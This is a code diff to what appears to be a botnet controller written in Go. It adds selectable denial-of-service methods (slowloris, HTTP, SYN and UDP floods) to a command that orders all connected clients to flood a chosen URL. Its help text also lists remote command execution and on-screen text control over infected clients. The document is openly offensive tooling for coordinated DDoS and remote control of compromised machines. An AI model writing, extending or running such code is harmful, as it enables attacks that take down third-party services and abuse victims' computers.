@@ -28,6 +28,7 @@ type server struct {
 }
 
 type floodParamas struct {
+	Type        int
 	url         string
 	num_threads int
 	limit       int
@@ -160,6 +161,7 @@ func (s *server) GetFlood(ctx context.Context, in *pb.Void) (*pb.FloodData, erro
 		x := flood_params
 		flood_params = nil
 		return &pb.FloodData{
+			FloodType:   int32(x.Type),
 			ShouldFlood: true,
 			Url:         x.url,
 			Limit:       int64(x.limit),
@@ -167,6 +169,10 @@ func (s *server) GetFlood(ctx context.Context, in *pb.Void) (*pb.FloodData, erro
 	}
 
 	return &pb.FloodData{ShouldFlood: false}, nil
+}
+
+func (s *server) GetDialog(context.Context, *pb.Void) (*pb.DialogData, error) {
+	return &pb.DialogData{ShouldShowDialog: false}, nil
 }
 
 type model struct {
@@ -310,7 +316,7 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 
 			if len(m.textInput.Value()) >= 5 && m.textInput.Value()[:5] == "flood" {
 				split_str := strings.Fields(m.textInput.Value())
-				if len(split_str) <= 3 {
+				if len(split_str) <= 4 {
 					m.showfloodusage = true
 					return m, nil
 				}
@@ -325,7 +331,19 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 					m.showfloodusage = true
 				}
 
-				flood_params = &floodParamas{url: split_str[1], limit: limit, num_threads: threads}
+				var floodType int = 0
+				switch strings.ToLower(split_str[4]) {
+				case "slowloris":
+					floodType = 0
+				case "httpflood":
+					floodType = 1
+				case "synflood":
+					floodType = 2
+				case "udpflood":
+					floodType = 3
+				}
+
+				flood_params = &floodParamas{url: split_str[1], limit: limit, num_threads: threads, Type: floodType}
 				m.showfloodoutput = true
 			}
 
@@ -364,7 +382,8 @@ func (m model) View() string {
 			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [`text`]") + ")\n\n" +
 			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [`command string`]") + ")\n\n" +
 			green("list_clients") + "\nlist currently connected clients (usage: " + yellow("list_clients [client id]") + ")\n\n" +
-			green("cleartext") + "\nclear on screen text for selected client (usage: " + yellow("cleartext") + ")"
+			green("cleartext") + "\nclear on screen text for selected client (usage: " + yellow("cleartext") + ")\n\n" +
+			green("flood") + "\nflood a url using all clients (usage: " + yellow("flood [url] [time limit] [worker count] [flood type]") + ") " + "flood type can be (slowloris, httpflood, synflood, udpflood)\n"
 	}
 	if m.showclientlist {
 		Magenta := color.New(color.FgMagenta).SprintFunc()
@@ -393,7 +412,7 @@ func (m model) View() string {
 	}
 	if m.showfloodusage {
 		red := color.New(color.FgRed).SprintFunc()
-		return m.textInput.View() + "\n\n" + red("usage: flood [url] [time limit] [threads]")
+		return m.textInput.View() + "\n\n" + red("usage: flood [url] [time limit] [worker count] [flood type] "+"flood type can be (slowloris, httpflood, synflood, udpflood)\n")
 	}
 	if m.showfloodoutput {
 
